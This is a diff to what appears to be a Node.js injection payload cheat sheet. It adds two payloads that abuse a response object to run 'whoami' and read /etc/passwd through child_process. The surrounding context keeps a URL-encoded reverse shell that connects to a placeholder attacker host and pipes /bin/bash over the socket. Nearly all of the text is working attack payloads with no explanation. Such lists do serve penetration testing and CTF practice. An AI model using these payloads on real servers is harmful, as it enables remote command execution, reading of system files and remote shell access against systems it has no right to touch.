@@ -68,6 +68,14 @@ Using net (by [ibreak.software](http://ibreak.software))
 var+net+=+require("net"),+sh+=+require("child_process").exec("/bin/bash");var+client+=+new+net.Socket();client.connect(80,+"attackerip",+function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
 ```
 
+Using arguments[1] as response object (by [@OrhanAlbay](https://twitter.com/OrhanAlbay))
+```javascript
+arguments[1].end(require('child_process').execSync('whoami'))
+```
+```javascript
+arguments[1].end(require('child_process').execSync('cat /etc/passwd'))
+```
+
 ### Need More ?
 Repository would be mainted time to time. Feel free to contribute.
 
